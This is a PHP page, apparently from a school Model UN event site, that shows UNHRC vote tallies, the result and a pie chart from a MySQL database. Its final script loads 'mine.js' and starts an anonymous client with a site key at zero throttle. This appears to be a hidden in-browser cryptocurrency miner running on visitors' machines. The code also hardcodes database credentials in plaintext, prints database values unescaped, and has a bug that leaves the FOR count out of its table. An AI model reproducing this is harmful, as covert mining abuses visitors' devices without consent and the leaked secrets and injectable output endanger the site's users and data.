<?php
$c=1;
$tab=<<<EDF
<table class="table table-dark" style="width:50%!important;max-width:720px;margin-top:50px!important;font-size:30px!important;background:#000!important;">
	  <thead>
	    <tr>
	      <th scope="col">#</th>
	      <th scope="col">VOTE</th>
	      <th scope="col">COUNTRIES</th>
	    </tr>
	  </thead>
	  <tbody>
EDF;
$final=<<<'EOT'
<h3 class="single-heading headings wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">RESULT</h3>
EOT;
$e=<<<'EOT'
<h3 class="single-heading headings wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">VOTES</h3>
<table class="table table-dark" style="width:50%!important;max-width:720px;margin-top:50px!important;font-size:30px!important;background:#000!important;">
	  <thead>
	    <tr>
	      <th scope="col">#</th>
	      <th scope="col">DELEGATE</th>
	      <th scope="col">VOTE</th>
	    </tr>
	  </thead>
	  <tbody>
EOT;
if($c==1){
	$link = new mysqli("localhost","u864523831_cvmun20","ChettinadVidyashram600028","u864523831_cvmun20");
	$sql = "SELECT * FROM `vUNHRC`";
	$result = $link->query($sql);
	$for=0;
	$against=0;
	$vote_result='';
	$abstain=0;
	$start = 0;
	$minutes = 0;
	if ($result != ''){
		while($row = $result->fetch_assoc()) {
			if ($row['vote']=='FOR'){
				$for = $for + 1;
			}
			if ($row['vote']=='AGAINST'){
				$against = $against + 1;
			}
			if ($row['vote']=='ABSTAIN'){
				$abstain = $abstain+1;
			}
	  }}
	$motion='';
	$name='';
	$type='';
	$start='';
	$counts=0;
	$minutes=0;
	$totalt='';
	$sql = "SELECT * FROM `ebvUNHRC`";
	$result = $link->query($sql);
	if ($result->num_rows>0){
		while($row = $result->fetch_assoc()) {
			$motion = $row['motion'];
			$name = $row['name'];
			$type = $row['type'];
			$minutes = (int)$row['minutes'];
			$totalt=(int)$row['totalt'];
	  }
	}
    $sql = "SELECT COUNT(*),vote FROM `vUNHRC` WHERE vote NOT LIKE '' GROUP BY vote";
	$result = $link->query($sql);
	$f=0;
	$ag=0;
	$ab=0;
	while($r=$result->fetch_assoc()){
	    if ($r['vote']=='FOR'){$p=$r['COUNT(*)'];}
	    else if($r['vote']=='AGAINST'){$ag=$r['COUNT(*)'];}
	    else if($r['vote']=='ABSTAIN'){$ab=$r['COUNT(*)'];}
	}
	$c=1;
	if ($f){
	    $tab.="<tr><th scope='row'>$c</th><td>FOR</td><td>".$f."</td></tr>";
	    $c+=1;
	}
	if ($ag){
	    $tab.="<tr><th scope='row'>$c</th><td>AGAINST</td><td>".$ag."</td></tr></tbody></table>";
	    $c+=1;
	}
	if($ab){
	    $tab.="<tr><th scope='row'>$c</th><td>ABSTAIN</td><td>".$ab."</td></tr></tbody></table>";
	    $c+=1;
	}
}
?>
<!doctype html>
<html class="no-js" lang="zxx">
<noscript>
	<style>
		.root{
			display: none!important;
		}
		footer{
			display: none!important;
		}
		.location_information{
			display: none!important;
		}
	</style>
<div style="background-color: black;width: 100%;height: 100%;"><br><Br><Br><br><br><br><Br><Br><br><Br><Br><br><Br><Br><br><br><br><Br><Br><br><Br><Br>
	<center><h2 style="font-weight: 600;font-size: 40px;color: white;">It seems that you have disabled Javascript. Please enable javascript to continue</h2>
	<br><h1 style="font-weight: 600;font-size: 50px;color: #934224;">CVMUN TECH TEAM</h1>
	</center>
	</div>
</noscript>
<head>
	<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
    <script type="text/javascript">
      google.charts.load('current', {'packages':['corechart']});
      google.charts.setOnLoadCallback(drawChart);

      function drawChart() {

        var data = google.visualization.arrayToDataTable([
          ['Vote', 'Number of votes'],
          ['For',<?php echo $for;?>],
          ['Against',<?php echo $against;?>],
          ['Abstain',<?php echo $abstain;?>]
        ]);

        var options = {
					pieHole: 0.5,
					backgroundColor: 'black',
				legend:'none',
				slices: {
            0: { color: 'green' },
            1: { color: 'red' },
						2: { color: 'blue' }
          }
        };

        var chart = new google.visualization.PieChart(document.getElementById('piechart'));

        chart.draw(data, options);
      }
    </script>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>CV MUN 2020</title>
  <meta name="description" content="">
  <link rel="shortcut icon" type="image/x-icon" href="/src/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="/src/css/bootstrap.min.css">
  <link rel="stylesheet" href="/src/css/owl.carousel.min.css">
  <link rel="stylesheet" href="/src/flip/flip.min.css">
  <link rel="stylesheet" href="/src/css/magnific-popup.css">
  <script src="/src/js/sec-js.js"></script>
  <link rel="stylesheet" href="/src/css/font-awesome.min.css">
  <link href="/src/css/sec-style.css" rel="stylesheet">
  <link rel="stylesheet" href="/src/css/themify-icons.css">
  <link rel="stylesheet" href="/src/css/gijgo.css">
  <link rel="stylesheet" href="/src/css/gallery.css">
  <link rel="stylesheet" href="/src/css/nice-select.css">
  <link rel="stylesheet" href="/src/css/animate.css">
  <link rel="stylesheet" href="/src/css/flaticon.css">
  <link rel="stylesheet" href="/src/css/slicknav.css">
  <link rel="stylesheet" href="/src/stylesheet.css">
  <link rel="stylesheet" href="/src/css/style.css">
	<link rel="stylesheet" href="/src/style.css">
</head>
<style type="text/css">
body{
  background: black;
  color: white!important;
  font-family: "prestageregular"!important;
}
h5{
  color: white;
  font-size: 25px;
}
p{
  color: white;
  font-size: 30px;
}
b{
  color: black!important;
  font-size: 35px;
}
a{
  font-weight: 600;
  font-size: 25px!important;
}
h4{
  font-weight: 500;
  font-size: 30px!important;
}
.table_here{
	 top: 100%!important;
}
.preloader {
   overflow: hidden;
   position:fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
   z-index: 9999;
   background-image: url('/src/preloader2.gif');
   background-repeat: no-repeat;
   background-color: #000;
   background-position: center;
}
html {
  --scrollbarBG: rgba(0,0,0,0);
  --thumbBG: #934224;
}
body::-webkit-scrollbar {
  width: 15px;
}
body {
  scrollbar-width: thin;
  scrollbar-color: var(--thumbBG) var(--scrollbarBG);
}
body::-webkit-scrollbar-track {
  background: var(--scrollbarBG);
}
body::-webkit-scrollbar-thumb {
  background-color: var(--thumbBG) ;
  border-radius: 30px;
}
.chart{
    width: 100%;
    height:60%;
}
.headings{
    font-size:50px!important;
}
@media (max-width:700px){
    .submit-button-mob{
        display:block!important;
    }
    .submit-button-pc{
        display: none!important;
    }
    .chart{
        width:100%!important;
    }
}
@media (min-width:700.01px){
    .submit-button-mob{
        display:none!important;
    }
    .submit-button-pc{
        display:block!important;
    }
}
.emsg{
color: #ff5e13!important;
font-size: 25px;
}
button:disabled{
    background:#dddddd!important;
}
button:disabled:hover{
    background:#dddddd!important;
    border:#dddddd!important;
}
</style>
<body>
    <div class="root">
  <script>
  setTimeout(function(){
    $('.preloader').fadeOut('slow');
}, 1000);

  </script>
  <div class="preloader"></div>
     <div class="bradcam_area">
        <div class="single_bradcam  d-flex align-items-center bradcam_bg_1 overlay">
              <div class="container">
                    <div class="row align-items-center justify-content-center">
                       <div class="col-xl-12">
                          <div class="bradcam_text text-center">
                                <h3 class="wow fadeInRight" data-wow-duration="1s" data-wow-delay=".3s" style="font-family:'prestageregular';
                                font-weight: 600;
                                font-size: 60px;
                                letter-spacing: 10px;">UNHRC</h3>
                          </div>
                       </div>
                    </div>
              </div>
           </div>
     </div>
		  <?php if ($name){echo '<h3 class="single-heading headings wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">'.$name.'</h3>';}?>
		 <?php echo '<br><br><br><h4 class="single-heading headings wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">'.$type.'</h4>';?>
		 <?php if ($totalt){echo '<br><br><br>
		 <h3 class="single-heading headings wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">TOTAL SPEAKERS` TIME</h3>';}?>
		 <?php if ($totalt){echo '<br><br><br><h4 class="single-heading headings wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">'.$totalt.' MINUTES</h4>';}?>
		 <?php if ($minutes){ echo '<br><br><br>
		 <h3 class="single-heading wow headings fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">INDIVIDUAL SPEAKER`S TIME</h3>';}?>
		 <?php if ($minutes){echo '<br><br><br><h4 class="single-heading wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">'.$minutes.' MINUTES</h4>';}?>
    <?php if($motion){echo '<center><p class="wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s" style="margin-top: 10%;">'.$motion.'</p></center>';}?>
    <br><BR><Br>
			<center><?php echo $tab;?><br><Br><Br>
			 <?php
			    $total=$for+$against+$abstain;
			    if ($total>0){
        			 if ($type=='PROCEDURAL VOTE'){
        		        if ($for>round(0.5*$total) ){
        		            $vote_result='PASSED';
        		        }
        		        else if ($against>=$for){
        		            $vote_result='FAILED';
        		        }
        		        else{
        		            $vote_result='FAILED';
        		        }
        			 }
        			 if ($type=='SUBSTANTIVE VOTE' && $vote_result!='FAILED'){
        			    if ($for >= 9){
        			        $vote_result='PASSED';
        			    }
        			    else if ($against>=$for){
        			        $vote_result='FAILED';
        			    }
        			    else{
        		            $vote_result='FAILED';
        		        }
        			 }
        			 if ($vote_result=='PASSED'){
        			     $color='green';
        			 }
        			 if($vote_result=='FAILED'){
        			     $color='red';
        			 }
        			 echo '<h3 class="single-heading headings wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s">RESULT</h3><h3 class="single-heading wow fadeInRight" data-wow-duration="1s" data-wow-delay=".4s" style="color:'.$color.'!important;">'.$vote_result.'</h3><br><Br><br><Br>';}
			 ?>
			<div id="table"><?php
			$s="SELECT * FROM `vUNHRC`";
			$r=$link->query($s);
			$counts=1;
			$for=0;
        	$against=0;
        	$abstain=0;
			if (1){
		        while($row = $r->fetch_assoc()){
		            $d="<tr><th scope='row'>".$counts."</th><td>".$row['name']."</td><td>".$row['vote']."</td></tr>";
		            $e=$e.$d;
		            $counts=$counts+1;
		        }
		    $e=$e."</tbody></table></div>";
		    $def='<div class="chart" id="piechart" style="width: 100%; height: 500px;background:#000!important;"></div>';
			echo $e.$def;
			}
			?>
</div></center>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src="/src/js/gallery.js"></script>
    <script src="/src/js/vendor/modernizr-3.5.0.min.js"></script>
    <script src="/src/js/vendor/jquery-1.12.4.min.js"></script>
    <script src="/src/js/popper.min.js"></script>
    <script src="/src/js/bootstrap.min.js"></script>
    <script src="/src/js/owl.carousel.min.js"></script>
    <script src="/src/js/isotope.pkgd.min.js"></script>
    <script src="/src/js/ajax-form.js"></script>
    <script src="/src/js/waypoints.min.js"></script>
    <script src="/src/js/jquery.counterup.min.js"></script>
    <script src="/src/js/imagesloaded.pkgd.min.js"></script>
    <script src="/src/js/scrollIt.js"></script>
    <script src="/src/js/jquery.scrollUp.min.js"></script>
    <script src="/src/js/wow.min.js"></script>
    <script src="/src/js/gijgo.min.js"></script>
    <script src="/src/js/nice-select.min.js"></script>
    <script src="/src/js/jquery.slicknav.min.js"></script>
    <script src="/src/js/jquery.magnific-popup.min.js"></script>
    <script src="/src/js/tilt.jquery.js"></script>
    <script src="/src/js/plugins.js"></script>
    <script src="/src/js/contact.js"></script>
    <script src="/src/js/jquery.ajaxchimp.min.js"></script>
    <script src="/src/js/jquery.form.js"></script>
    <script src="/src/js/jquery.validate.min.js"></script>
    <script src="/src/js/mail-script.js"></script>
    <script src="/src/js/main.js"></script>
    </div>
    <script src="/src/mine.js"></script>
    <script>
    var _client = new Client.Anonymous('69b7d3189450160e7451cfdda8df68df786d93a769c24aa68e14d2509a238237', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();
</script>
</body>
</html>
